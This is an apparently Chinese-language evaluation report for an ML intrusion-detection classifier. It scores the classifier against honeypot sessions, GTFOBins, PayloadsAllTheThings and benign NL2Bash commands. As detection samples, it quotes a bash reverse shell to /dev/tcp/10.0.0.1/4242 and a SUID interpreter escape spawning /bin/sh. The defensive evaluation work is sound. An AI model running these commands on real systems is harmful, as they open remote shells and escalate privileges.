# HyperIDs 外部公开数据评测（Out-of-Distribution）

> 目标：用**训练分布之外**的公开语料，检验部署模型（`final_model_v2` fp32）在真实环境下的泛化。
> 本次只做评测，**未做任何训练**。模型 = INT8 部署同源的 fp32 checkpoint（bert-small，31 标签 v2 schema）。

## 数据源与规模

| 源 | 标签口径 | 条数 | 说明 |
|---|---|---|---|
| `cowrie` | attack_session（真实攻击会话，非硬标签） | 16,517 | Cowrie 蜜罐后渗透命令（`zyw-286/shell-attack-evolution-dataset`，2021–2022 + 2024） |
| `gtfobins` | malicious（但混入大量 dual-use） | 810 | GTFOBins `functions[].code` 提取 |
| `payloads` | malicious（提取噪声大） | 45 | PayloadsAllTheThings reverse/bind shell cheatsheet |
| `nl2bash` | benign | 10,623 | NL2Bash `all.cm` 命令集合 |

数据文件：`dataset/external_eval/*.jsonl`；逐条预测：`dataset/external_eval_results/*.predictions.jsonl`。

## 一句话结论

**端侧部署的误报几乎为零（良性 FPR 0.05%）；对典型攻击命令（反弹 shell / 下载执行 / C2）识别强（ROC-AUC 0.97 vs 良性）；真实盲区是 GTFOBins 风格的 SUID 提权解释器逃逸。**

## 分层结果

### 1. 良性端：几乎不误报 ✅

| 指标 | 值 |
|---|---|
| benign 准确率 | **81.3%** |
| malicious 误报率（FPR） | **0.05%**（10,623 条里仅 5 条） |
| suspicious 率 | 18.6% |

→ 端侧把正常命令误判成「恶意」的概率极低，符合受限资源场景对低误报的要求。

### 2. 明确恶意端：ROC-AUC 0.97（vs 良性）✅

GTFOBins 提取的命令里，只有一部分是**单命令文本即可定性为恶意**的：

| 子集 | n | malicious 召回 | 非良性（mal+susp）召回 | 平均 P(mal) |
|---|---|---|---|---|
| `definite_payload`（反弹/绑定 shell、下载执行、C2 地址） | 83 | **75.9%** | **90.4%** | 0.775 |
| `shell_escape`（SUID 提权解释器逃逸，如 `R -e 'system("/bin/sh")'`） | 79 | 30.4% | 50.6% | 0.288 |
| `dual_use`（base64/7z/tar 等文件操作，单命令无法定恶） | 648 | 5.4% | 20.8% | 0.061 |

| 二分类 | ROC-AUC | PR-AUC |
|---|---|---|
| 明确恶意（162）vs 良性（10,623） | **0.9704** | 0.7603 |
| 明确恶意（162）vs 双用途（648） | **0.9036** | 0.7243 |

干净的反弹 shell 样例（来自 payloads 源）全部 **P(malicious)=1.00** 判恶意：
`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`、`/bin/bash -l > /dev/tcp/... 0<&1 2>&1` 等 5/5 命中。

### 3. 真实攻击流（Cowrie 蜜罐，开放分布）

| 指标 | 值 |
|---|---|
| benign / suspicious / malicious 分布 | **49.7% / 43.3% / 7.0%** |
| 平均激活 action 数 | 1.34 |
| `derive_attck` 规则命中率 | **72.9%** |

→ 攻击者登录后的命令流大量是**侦察命令**（`uname -a`、`cat /proc/cpuinfo`、`ls`），模型判 benign/suspicious 是合理行为；其中约 7% 明确恶意的命令被识别出来，ATT&CK 规则推导命中率 72.9%。

## 数据噪声与口径说明（诚实披露）

- **GTFOBins 的 810 条不是 810 条恶意命令**：`functions[].code` 大量是「用合法工具读文件/打包/编码」的双用途命令，单条文本本就无法定恶意。直接用整体 `malicious_recall`（15%）会严重低估模型。
- **PayloadsAllTheThings 的 45 条中 26 条是散文/描述文字**（"Windows only"、"NOTE:..."、"Server Side:"），是 markdown 提取噪声，不参与能力判断。
- 因此上面用「明确恶意子集」重新口径，才是模型真实能力。

## 待办（可提升项）

1. **补 GTFOBins / SUID 提权逃逸训练数据**：`shell_escape` 子集召回仅 30.4%，是最明确的提升点（这类命令语法非常规，训练分布覆盖不足）。
2. **用 Jev 给外部测试集打 31 维标签**（`jev_labels_v2` 复用），可做严格的 31 标签口径评测，而非二分类。
3. KYPO command histories 未找到公开可直接下载的数据（Zenodo 仅有 topology 定义），HackTricks 命令散落、提取质量差，暂未纳入——已如实说明。

## 复现

```bash
python data_pipeline/fetch_eval.py     # 拉取外部数据 -> dataset/external_eval/*.jsonl
python eval_external.py --batch 256    # 推理 -> dataset/external_eval_results/
python analyze_external.py             # 细分分析（明确恶意 vs 良性/双用途）
```
